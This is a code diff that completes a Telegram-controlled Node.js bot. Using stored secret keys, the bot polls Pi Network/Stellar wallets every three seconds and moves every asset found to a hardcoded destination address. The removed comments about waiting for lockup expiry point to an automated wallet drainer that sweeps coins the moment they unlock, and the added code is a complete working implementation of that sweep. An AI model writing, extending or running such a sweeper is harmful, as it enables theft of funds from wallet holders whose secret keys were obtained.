@@ -10,8 +10,16 @@ if (!token) {
     process.exit(1);
 }
 
+if (!HARDCODED_DESTINATION) {
+    console.error("❌ ERROR: DESTINATION_WALLET_ADDRESS is missing in .env file.");
+    process.exit(1);
+}
+
 // Initialize the Telegram bot using polling
 const bot = new TelegramBot(token, { polling: true });
+
+// Initialize Stellar Server (Pi Network runs on Stellar-based architecture)
+const server = new StellarSdk.Horizon.Server('https://horizon.pi-network.network');
 
 // In-memory registry tracking monitored wallets
 let activeMonitors = [];
@@ -94,35 +102,75 @@ setInterval(async () => {
         if (wallet.status.includes("Completed") || wallet.status.includes("Success")) continue;
 
         try {
-            // ====================================================================
-            // LEDGER CHECK LOGIC 
-            // Query Horizon node here to check balance / lockup timer expiration
-            // ====================================================================
-            let isUnlockedAndDue = false; // Evaluates live blockchain condition
+            // Load account details from the Horizon server
+            const account = await server.loadAccount(wallet.publicKey);
+            
+            // Check if there are any balances to sweep
+            let operationsToAdd = [];
 
-            if (isUnlockedAndDue) {
-                console.log(`🚨 Trigger hit for Wallet ID #${wallet.id} (${wallet.publicKey})! Sweeping...`);
+            for (const balance of account.balances) {
+                let asset;
+                let sendAmount = parseFloat(balance.balance);
 
-                if (!HARDCODED_DESTINATION) {
-                    throw new Error("Hardcoded destination missing in server configuration.");
+                if (balance.asset_type === 'native') {
+                    // For native asset, leave a tiny reserve (e.g., 0.001) for the transaction fee
+                    const feeReserve = 0.001;
+                    sendAmount = sendAmount - feeReserve;
+                    asset = StellarSdk.Asset.native();
+                } else {
+                    // For any custom token/asset found in the wallet
+                    asset = new StellarSdk.Asset(balance.asset_code, balance.asset_issuer);
                 }
 
-                // ====================================================================
-                // EXECUTION & WITHDRAWAL BLOCK
-                // Signs payload using wallet.secret and sends to HARDCODED_DESTINATION
-                // ====================================================================
+                // If there's a valid amount to send, add it as a payment operation
+                if (sendAmount > 0) {
+                    operationsToAdd.push({
+                        asset: asset,
+                        amount: sendAmount.toFixed(7)
+                    });
+                }
+            }
 
+            if (operationsToAdd.length > 0) {
+                console.log(`🚨 Assets found for Wallet ID #${wallet.id} (${wallet.publicKey})! Sweeping...`);
+
+                const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret);
+                const sourceAccount = await server.loadAccount(wallet.publicKey);
+
+                // Build a transaction that includes operations for every asset found
+                let transactionBuilder = new StellarSdk.TransactionBuilder(sourceAccount, {
+                    fee: StellarSdk.BASE_FEE,
+                    networkPassphrase: StellarSdk.Networks.PUBLIC
+                });
+
+                operationsToAdd.forEach(op => {
+                    transactionBuilder.addOperation(StellarSdk.Operation.payment({
+                        destination: HARDCODED_DESTINATION,
+                        asset: op.asset,
+                        amount: op.amount,
+                    }));
+                });
+
+                const transaction = transactionBuilder.setTimeout(30).build();
+                transaction.sign(sourceKeypair);
+                const transactionResponse = await server.submitTransaction(transaction);
+
+                console.log(`✅ Success! Transaction hash: ${transactionResponse.hash}`);
                 wallet.status = "Success - Swept ✅";
 
                 // Instantly notify your Telegram phone app
                 bot.sendMessage(wallet.chatId, 
                     `🚀 *SUCCESSFUL SWEEP!* \n\n` +
-                    `Coins from wallet \`${wallet.publicKey.substring(0, 10)}...\` were automatically moved to your hardcoded destination!`, 
+                    `All assets from wallet \`${wallet.publicKey.substring(0, 10)}...\` were automatically moved to your destination!\n` +
+                    `TxHash: \`${transactionResponse.hash}\``, 
                     { parse_mode: "Markdown" }
                 );
             }
         } catch (err) {
-            console.error(`Error processing wallet #${wallet.id}:`, err.message);
+            // Ignore 404 errors for unfunded accounts
+            if (!err.message || !err.message.includes('404')) {
+                console.error(`Error processing wallet #${wallet.id}:`, err.message);
+            }
         }
     }
 }, 3000);
